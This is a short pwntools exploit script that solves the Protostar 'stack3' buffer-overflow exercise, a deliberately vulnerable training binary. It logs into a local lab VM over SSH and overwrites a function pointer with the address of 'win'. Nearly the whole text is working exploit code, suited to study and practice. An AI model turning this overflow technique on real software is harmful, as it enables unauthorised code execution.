from pwn import *

s = ssh(host='192.168.56.102', user='user', password='user')

# I went ahead and downloaded a local copy of the binary for this.
elf = ELF('./stack3')

target = elf.symbols['win']

proc = s.run('/opt/protostar/bin/stack3')
proc.sendline('\x41'*64 + p32(target))

out = proc.recv(1024)
print out
assert 'code flow successfully changed' in out
